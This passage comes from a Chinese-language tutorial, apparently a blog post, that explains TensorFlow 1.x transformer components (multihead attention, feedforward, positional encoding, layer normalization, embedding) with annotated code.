tf.tile<span class=\"params\">(tf.expand_dims(query_masks, -1)</span>, [1, 1, tf.shape<span class=\"params\">(keys)</span>[1]]) <span class=\"comment\"># (h*N, T_q, T_k)</span></span><br><span class=\"line\">        outputs *= query_masks <span class=\"comment\"># broadcasting. (N, T_q, C)</span></span><br><span class=\"line\">          </span><br><span class=\"line\">        <span class=\"comment\"># Dropouts</span></span><br><span class=\"line\">        outputs = tf.layers.dropout<span class=\"params\">(outputs, <span class=\"attr\">rate</span>=dropout_rate, <span class=\"attr\">training</span>=tf.convert_to_tensor(is_training)</span>)</span><br><span class=\"line\">               </span><br><span class=\"line\">        <span class=\"comment\"># Weighted sum</span></span><br><span class=\"line\">        outputs = tf.matmul<span class=\"params\">(outputs, V_)</span> <span class=\"comment\"># ( h*N, T_q, C/h)</span></span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Restore shape</span></span><br><span class=\"line\">        outputs = tf.concat<span class=\"params\">(tf.split(outputs, num_heads, <span class=\"attr\">axis</span>=0)</span>, axis=2 ) <span class=\"comment\"># (N, T_q, C)</span></span><br><span class=\"line\">              </span><br><span class=\"line\">        <span class=\"comment\"># Residual connection</span></span><br><span class=\"line\">        outputs += queries</span><br><span class=\"line\">              </span><br><span class=\"line\">        <span class=\"comment\"># Normalize</span></span><br><span class=\"line\">        <span class=\"comment\">#outputs = normalize(outputs) # (N, T_q, C)</span></span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"keyword\">if</span> with_qk: return Q,K</span><br><span class=\"line\">    else: return outputs</span><br><span class=\"line\"></span><br><span class=\"line\">def feedforward<span class=\"params\">(inputs, </span></span><br><span class=\"line\"><span class=\"params\">                <span class=\"attr\">num_units</span>=[2048, 512],</span></span><br><span class=\"line\"><span class=\"params\">                <span class=\"attr\">scope</span>=&quot;multihead_attention&quot;, </span></span><br><span class=\"line\"><span class=\"params\">                <span class=\"attr\">dropout_rate</span>=0.2,</span></span><br><span class=\"line\"><span class=\"params\">                <span class=\"attr\">is_training</span>=True,</span></span><br><span class=\"line\"><span class=\"params\">                <span class=\"attr\">reuse</span>=None)</span>:</span><br><span class=\"line\">    &#x27;&#x27;&#x27;Point-wise feed forward net.</span><br><span class=\"line\">    </span><br><span class=\"line\">    Args:</span><br><span class=\"line\">      inputs: A 3d tensor with shape of [N, T, C].</span><br><span class=\"line\">      num_units: A list of two integers.</span><br><span class=\"line\">      scope: Optional scope for `variable_scope`.</span><br><span class=\"line\">      reuse: Boolean, whether to reuse the weights of a previous layer</span><br><span class=\"line\">        by the same name.</span><br><span class=\"line\">        </span><br><span class=\"line\">    Returns:</span><br><span class=\"line\">      A 3d tensor with the same shape and dtype as inputs</span><br><span class=\"line\">    &#x27;&#x27;&#x27;</span><br><span class=\"line\">    with tf.variable_scope<span class=\"params\">(scope, <span class=\"attr\">reuse</span>=reuse)</span>:</span><br><span class=\"line\">        <span class=\"comment\"># Inner layer</span></span><br><span class=\"line\">        params = &#123;<span class=\"string\">&quot;inputs&quot;</span>: inputs, <span class=\"string\">&quot;filters&quot;</span>: num_units[0], <span class=\"string\">&quot;kernel_size&quot;</span>: 1,</span><br><span class=\"line\">                  <span class=\"string\">&quot;activation&quot;</span>: tf.nn.relu, <span class=\"string\">&quot;use_bias&quot;</span>: True&#125;</span><br><span class=\"line\">        outputs = tf.layers.conv1d<span class=\"params\">(**params)</span></span><br><span class=\"line\">        outputs = tf.layers.dropout<span class=\"params\">(outputs, <span class=\"attr\">rate</span>=dropout_rate, <span class=\"attr\">training</span>=tf.convert_to_tensor(is_training)</span>)</span><br><span class=\"line\">        <span class=\"comment\"># Readout layer</span></span><br><span class=\"line\">        params = &#123;<span class=\"string\">&quot;inputs&quot;</span>: outputs, <span class=\"string\">&quot;filters&quot;</span>: num_units[1], <span class=\"string\">&quot;kernel_size&quot;</span>: 1,</span><br><span class=\"line\">                  <span class=\"string\">&quot;activation&quot;</span>: None, <span class=\"string\">&quot;use_bias&quot;</span>: True&#125;</span><br><span class=\"line\">        outputs = tf.layers.conv1d<span class=\"params\">(**params)</span></span><br><span class=\"line\">        outputs = tf.layers.dropout<span class=\"params\">(outputs, <span class=\"attr\">rate</span>=dropout_rate, <span class=\"attr\">training</span>=tf.convert_to_tensor(is_training)</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Residual connection</span></span><br><span class=\"line\">        outputs += inputs</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\"># Normalize</span></span><br><span class=\"line\">        <span class=\"comment\">#outputs = normalize(outputs)</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    return outputs</span><br></pre></td></tr></table></figure>\n</code></pre>\n<h3 id=\"位置编码\"><a class=\"anchor\" href=\"#位置编码\">#</a> 位置编码</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">positional_encoding</span>(<span class=\"params\">dim, sentence_length, dtype=tf.float32</span>):</span><br><span class=\"line\">    encoded_vec = np.array([pos/np.power(<span class=\"number\">10000</span>, <span class=\"number\">2</span>*i/dim) <span class=\"keyword\">for</span> pos <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(sentence_length) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(dim)])</span><br><span class=\"line\">    encoded_vec[::<span class=\"number\">2</span>] = np.sin(encoded_vec[::<span class=\"number\">2</span>])</span><br><span class=\"line\">    encoded_vec[<span class=\"number\">1</span>::<span class=\"number\">2</span>] = np.cos(encoded_vec[<span class=\"number\">1</span>::<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tf.convert_to_tensor(encoded_vec.reshape([sentence_length, dim]), dtype=dtype)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>定义了名为位置编码的函数， <code>dim</code>  表示向量的维度， <code>sentence_length</code>  表示句子的长度， <code>dtype</code>  表示输出张量的数据类型</li>\n<li><code>encoded_vec</code>  使用嵌套列表解析生成一个 1D 的 numpy 数组  <code>encoded_vec</code> 。\n<ul>\n<li>外层循环  <code>for pos in range(sentence_length)</code>  遍历句子的每个位置。</li>\n<li>内层循环  <code>for i in range(dim)</code>  遍历编码向量的每个维度。</li>\n<li>计算公式  <code>pos/np.power(10000, 2*i/dim)</code>  生成位置编码值。</li>\n</ul>\n</li>\n<li><code>  encoded_vec[::2] = np.sin(encoded_vec[::2])</code> : 这一行将编码向量中偶数索引位置的值替换为它们的正弦值，即  <code>encoded_vec</code>  的每隔两个元素（从索引 0 开始）的值。</li>\n<li><code>  encoded_vec[1::2] = np.cos(encoded_vec[1::2])</code> : 这一行将编码向量中奇数索引位置的值替换为它们的余弦值，即  <code>encoded_vec</code>  的每隔两个元素（从索引 1 开始）的值。</li>\n<li><code>return</code> : 行将  <code>encoded_vec</code>  重新调整为形状  <code>[sentence_length, dim]</code> ，即将其从 1D 数组重塑为 2D 数组。</li>\n</ul>\n<h3 id=\"层归一化-2\"><a class=\"anchor\" href=\"#层归一化-2\">#</a> 层归一化</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">normalize</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">              epsilon=<span class=\"number\">1e-8</span>,</span></span><br><span class=\"line\"><span class=\"params\">              scope=<span class=\"string\">&quot;ln&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">              reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br><span class=\"line\">        inputs_shape = inputs.get_shape()</span><br><span class=\"line\">        params_shape = inputs_shape[-<span class=\"number\">1</span>:]</span><br><span class=\"line\">        mean, variance = tf.nn.moments(inputs, [-<span class=\"number\">1</span>], keep_dims=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        beta = tf.Variable(tf.zeros(params_shape))</span><br><span class=\"line\">        gamma = tf.Variable(tf.ones(params_shape))</span><br><span class=\"line\">        normalized = (inputs - mean) / ((variance + epsilon) ** <span class=\"number\">0.5</span>)</span><br><span class=\"line\">        outputs = gamma * normalized + beta</span><br><span class=\"line\">    <span class=\"keyword\">return</span> outputs</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"函数作用域\"><a class=\"anchor\" href=\"#函数作用域\">#</a> 函数作用域</h4>\n<ul>\n<li><code>inputs</code> : 输入张量</li>\n<li><code>epsilon</code> : 一个小常数，用于避免除以零的情况，默认值为  <code>1e-8</code> 。</li>\n<li><code>scope</code> : 变量作用域的名称，默认值为  <code>&quot;ln&quot;</code> 。</li>\n<li><code>reuse</code> : 是否重用变量，默认值为  <code>None</code> 。</li>\n</ul>\n<h4 id=\"变量作用域\"><a class=\"anchor\" href=\"#变量作用域\">#</a> 变量作用域</h4>\n<ul>\n<li><code>scope</code> : 变量作用域的名称。</li>\n<li><code>reuse</code> : 是否重用现有的变量。</li>\n</ul>\n<h4 id=\"获取输入张量的形状\"><a class=\"anchor\" href=\"#获取输入张量的形状\">#</a> 获取输入张量的形状</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">inputs_shape = inputs.get_shape()</span><br><span class=\"line\">params_shape = inputs_shape[-<span class=\"number\">1</span>:]</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>inputs_shape</code> : 获取输入张量的形状。</li>\n<li><code>params_shape</code> : 获取最后一个维度的形状，这将用于归一化参数  <code>beta</code>  和  <code>gamma</code>  的形状。</li>\n</ul>\n<h4 id=\"计算均值和方差\"><a class=\"anchor\" href=\"#计算均值和方差\">#</a> 计算均值和方差</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mean, variance = tf.nn.moments(inputs, [-<span class=\"number\">1</span>], keep_dims=<span class=\"literal\">True</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>tf.nn.moments(inputs, [-1], keep_dims=True)</code> : 计算输入张量在最后一个维度上的均值和方差，并保持原始维度的形状。</li>\n</ul>\n<h4 id=\"定义变量\"><a class=\"anchor\" href=\"#定义变量\">#</a> 定义变量</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">beta = tf.Variable(tf.zeros(params_shape))</span><br><span class=\"line\">gamma = tf.Variable(tf.ones(params_shape))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>beta</code> : 偏移量变量，初始化为零，形状为  <code>params_shape</code> 。</li>\n<li><code>gamma</code> : 缩放量变量，初始化为一，形状为  <code>params_shape</code> 。</li>\n</ul>\n<h4 id=\"归一化\"><a class=\"anchor\" href=\"#归一化\">#</a> 归一化</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">normalized = (inputs - mean) / ((variance + epsilon) ** <span class=\"number\">0.5</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>输入张量减去均值</li>\n<li>然后除以标准差，添加 espsilon 是避免除以零</li>\n</ul>\n<h4 id=\"应用缩放和偏移\"><a class=\"anchor\" href=\"#应用缩放和偏移\">#</a> 应用缩放和偏移</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = gamma * normalized + beta</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>gamma * normalized</code> : 对归一化后的张量进行缩放。</li>\n<li><code>gamma * normalized + beta</code> : 对归一化并缩放后的张量进行偏移。</li>\n</ul>\n<ul>\n<li>返回应用了层归一化后的输出张量  <code>outputs</code> 。</li>\n</ul>\n<h3 id=\"嵌入层-2\"><a class=\"anchor\" href=\"#嵌入层-2\">#</a> 嵌入层</h3>\n<p><strong>作用</strong>：将输入的词 ID 映射到对应的嵌入向量。通过嵌入表查找，生成词嵌入矩阵，可以选择是否将 ID 为 0 的词嵌入设为 0，且可以对嵌入进行缩放。</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">embedding</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">              vocab_size, </span></span><br><span class=\"line\"><span class=\"params\">              num_units, </span></span><br><span class=\"line\"><span class=\"params\">              zero_pad=<span class=\"literal\">True</span>, </span></span><br><span class=\"line\"><span class=\"params\">              scale=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">              l2_reg=<span class=\"number\">0.0</span>,</span></span><br><span class=\"line\"><span class=\"params\">              scope=<span class=\"string\">&quot;embedding&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">              with_t=<span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">              reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br><span class=\"line\">        lookup_table = tf.get_variable(<span class=\"string\">&#x27;lookup_table&#x27;</span>,</span><br><span class=\"line\">                                       dtype=tf.float32,</span><br><span class=\"line\">                                       shape=[vocab_size, num_units],</span><br><span class=\"line\">                                       regularizer=tf.contrib.layers.l2_regularizer(l2_reg))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> zero_pad:</span><br><span class=\"line\">            lookup_table = tf.concat((tf.zeros(shape=[<span class=\"number\">1</span>, num_units]),</span><br><span class=\"line\">                                      lookup_table[<span class=\"number\">1</span>:, :]), <span class=\"number\">0</span>)</span><br><span class=\"line\">        outputs = tf.nn.embedding_lookup(lookup_table, inputs)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> scale:</span><br><span class=\"line\">            outputs = outputs * (num_units ** <span class=\"number\">0.5</span>) </span><br><span class=\"line\">    <span class=\"keyword\">if</span> with_t: <span class=\"keyword\">return</span> outputs, lookup_table</span><br><span class=\"line\">    <span class=\"keyword\">else</span>: <span class=\"keyword\">return</span> outputs</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"定义函数\"><a class=\"anchor\" href=\"#定义函数\">#</a> 定义函数</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">embedding</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">              vocab_size, </span></span><br><span class=\"line\"><span class=\"params\">              num_units, </span></span><br><span class=\"line\"><span class=\"params\">              zero_pad=<span class=\"literal\">True</span>, </span></span><br><span class=\"line\"><span class=\"params\">              scale=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">              l2_reg=<span class=\"number\">0.0</span>,</span></span><br><span class=\"line\"><span class=\"params\">              scope=<span class=\"string\">&quot;embedding&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">              with_t=<span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">              reuse=<span class=\"literal\">None</span></span>):</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>inputs</code> : 输入张量，通常是词汇的索引。</li>\n<li><code>vocab_size</code> : 词汇表的大小，即词汇的数量。</li>\n<li><code>num_units</code> : 嵌入向量的维度，即每个词汇映射后的向量表示的长度。</li>\n<li><code>zero_pad</code> : 是否将索引为 0 的位置填充为零向量，默认为  <code>True</code> 。</li>\n<li><code>scale</code> : 是否对嵌入向量进行缩放，默认为  <code>True</code> 。</li>\n<li><code>l2_reg</code> : L2 正则化的参数，默认为  <code>0.0</code> 。</li>\n<li><code>scope</code> : 变量作用域的名称，默认为  <code>&quot;embedding&quot;</code> 。</li>\n<li><code>with_t</code> : 是否返回嵌入矩阵，默认为  <code>False</code> 。</li>\n<li><code>reuse</code> : 是否重用变量，默认为  <code>None</code> 。</li>\n</ul>\n<h4 id=\"变量作用域-2\"><a class=\"anchor\" href=\"#变量作用域-2\">#</a> 变量作用域</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>scope</code> : 变量作用域的名称。</li>\n<li><code>reuse</code> : 是否重用现有的变量。</li>\n</ul>\n<h4 id=\"创建嵌入矩阵\"><a class=\"anchor\" href=\"#创建嵌入矩阵\">#</a> 创建嵌入矩阵</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">lookup_table = tf.get_variable(<span class=\"string\">&#x27;lookup_table&#x27;</span>,</span><br><span class=\"line\">                               dtype=tf.float32,</span><br><span class=\"line\">                               shape=[vocab_size, num_units],</span><br><span class=\"line\">                               regularizer=tf.contrib.layers.l2_regularizer(l2_reg))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>lookup_table</code> : 创建嵌入矩阵变量，形状为  <code>[vocab_size, num_units]</code> 。意味着你有  <code>vocab_size</code>  个单词，每个单词都被表示为一个  <code>num_units</code>  维的向量。</li>\n<li><code>dtype=tf.float32</code> : 数据类型为浮点数。</li>\n<li><code>regularizer=tf.contrib.layers.l2_regularizer(l2_reg)</code> : 使用 L2 正则化。</li>\n</ul>\n<h4 id=\"填充零向量\"><a class=\"anchor\" href=\"#填充零向量\">#</a> 填充零向量</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> zero_pad:</span><br><span class=\"line\">    lookup_table = tf.concat((tf.zeros(shape=[<span class=\"number\">1</span>, num_units]),</span><br><span class=\"line\">                              lookup_table[<span class=\"number\">1</span>:, :]), <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>tf.zeros(shape=[1, num_units])</code> : 创建一个零向量，形状为  <code>[1, num_units]</code> 。</li>\n<li><code>tf.concat((tf.zeros(shape=[1, num_units]), lookup_table[1:, :]), 0)</code> : 将零向量与嵌入矩阵的其余部分连接起来，从而使索引为 0 的位置填充为零向量。</li>\n</ul>\n<h4 id=\"查找嵌入矩阵\"><a class=\"anchor\" href=\"#查找嵌入矩阵\">#</a> 查找嵌入矩阵</h4>\n<p><figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">outputs</span> = tf.nn.embedding_lookup(lookup_table, inputs)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>tf.nn.embedding_lookup(lookup_table, inputs)</code> : 根据输入张量  <code>inputs</code>  中的索引查找嵌入矩阵  <code>lookup_table</code>  中的向量表示，并返回这些表示。</li>\n</ul>\n<h4 id=\"对嵌入向量进行缩放\"><a class=\"anchor\" href=\"#对嵌入向量进行缩放\">#</a> 对嵌入向量进行缩放</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> scale:</span><br><span class=\"line\">    outputs = outputs * (num_units ** <span class=\"number\">0.5</span>) </span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>outputs = outputs * (num_units ** 0.5)</code> : 如果  <code>scale</code>  为  <code>True</code> ，则对嵌入向量进行缩放，缩放因子为  <code>num_units</code>  的平方根。</li>\n</ul>\n<h3 id=\"多头注意力机制-multihead_attention\"><a class=\"anchor\" href=\"#多头注意力机制-multihead_attention\">#</a> 多头注意力机制  <code>multihead_attention</code></h3>\n<p><strong>作用</strong>：实现多头自注意力机制。将查询、键和值线性变换为多头形式，计算注意力权重并应用于值，通过多个头并行计算来捕捉不同的注意力模式，最后将输出拼接并添加残差连接.</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">multihead_attention</span>(<span class=\"params\">queries, </span></span><br><span class=\"line\"><span class=\"params\">                        keys, </span></span><br><span class=\"line\"><span class=\"params\">                        num_units=<span class=\"literal\">None</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        num_heads=<span class=\"number\">8</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        dropout_rate=<span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        is_training=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        causality=<span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        scope=<span class=\"string\">&quot;multihead_attention&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        reuse=<span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        with_qk=<span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> num_units <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            num_units = queries.get_shape().as_list[-<span class=\"number\">1</span>]</span><br><span class=\"line\">        </span><br><span class=\"line\">        Q = tf.layers.dense(queries, num_units, activation=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        K = tf.layers.dense(keys, num_units, activation=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        V = tf.layers.dense(keys, num_units, activation=<span class=\"literal\">None</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        Q_ = tf.concat(tf.split(Q, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">        K_ = tf.concat(tf.split(K, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">        V_ = tf.concat(tf.split(V, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        outputs = tf.matmul(Q_, tf.transpose(K_, [<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]))</span><br><span class=\"line\">        outputs = outputs / (K_.get_shape().as_list()[-<span class=\"number\">1</span>] ** <span class=\"number\">0.5</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\">        key_masks = tf.sign(tf.reduce_sum(tf.<span class=\"built_in\">abs</span>(keys), axis=-<span class=\"number\">1</span>))</span><br><span class=\"line\">        key_masks = tf.tile(key_masks, [num_heads, <span class=\"number\">1</span>])</span><br><span class=\"line\">        key_masks = tf.tile(tf.expand_dims(key_masks, <span class=\"number\">1</span>), [<span class=\"number\">1</span>, tf.shape(queries)[<span class=\"number\">1</span>], <span class=\"number\">1</span>])</span><br><span class=\"line\">        </span><br><span class=\"line\">        paddings = tf.ones_like(outputs) * (-<span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span>)</span><br><span class=\"line\">        outputs = tf.where(tf.equal(key_masks, <span class=\"number\">0</span>), paddings, outputs)</span><br><span class=\"line\">  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> causality:</span><br><span class=\"line\">            diag_vals = tf.ones_like(outputs[<span class=\"number\">0</span>, :, :])</span><br><span class=\"line\">            tril = tf.linalg.LinearOperatorLowerTriangular(diag_vals).to_dense()</span><br><span class=\"line\">            masks = tf.tile(tf.expand_dims(tril, <span class=\"number\">0</span>), [tf.shape(outputs)[<span class=\"number\">0</span>], <span class=\"number\">1</span>, <span class=\"number\">1</span>])</span><br><span class=\"line\">            paddings = tf.ones_like(masks) * (-<span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span>)</span><br><span class=\"line\">            outputs = tf.where(tf.equal(masks, <span class=\"number\">0</span>), paddings, outputs)</span><br><span class=\"line\">  </span><br><span class=\"line\">        outputs = tf.nn.softmax(outputs)</span><br><span class=\"line\">         </span><br><span class=\"line\">        query_masks = tf.sign(tf.reduce_sum(tf.<span class=\"built_in\">abs</span>(queries), axis=-<span class=\"number\">1</span>))</span><br><span class=\"line\">        query_masks = tf.tile(query_masks, [num_heads, <span class=\"number\">1</span>])</span><br><span class=\"line\">        query_masks = tf.tile(tf.expand_dims(query_masks, -<span class=\"number\">1</span>), [<span class=\"number\">1</span>, <span class=\"number\">1</span>, tf.shape(keys)[<span class=\"number\">1</span>]])</span><br><span class=\"line\">        outputs *= query_masks</span><br><span class=\"line\">          </span><br><span class=\"line\">        outputs = tf.layers.dropout(outputs, rate=dropout_rate, training=tf.convert_to_tensor(is_training))</span><br><span class=\"line\">        outputs = tf.matmul(outputs, V_)</span><br><span class=\"line\">        outputs = tf.concat(tf.split(outputs, num_heads, axis=<span class=\"number\">0</span>), axis=<span class=\"number\">2</span>)</span><br><span class=\"line\">        outputs += queries</span><br><span class=\"line\">    <span class=\"keyword\">if</span> with_qk: <span class=\"keyword\">return</span> Q, K</span><br><span class=\"line\">    <span class=\"keyword\">else</span>: <span class=\"keyword\">return</span> outputs</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"函数定义\"><a class=\"anchor\" href=\"#函数定义\">#</a> 函数定义</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">multihead_attention</span>(<span class=\"params\">queries, </span></span><br><span class=\"line\"><span class=\"params\">                        keys, </span></span><br><span class=\"line\"><span class=\"params\">                        num_units=<span class=\"literal\">None</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        num_heads=<span class=\"number\">8</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        dropout_rate=<span class=\"number\">0</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        is_training=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        causality=<span 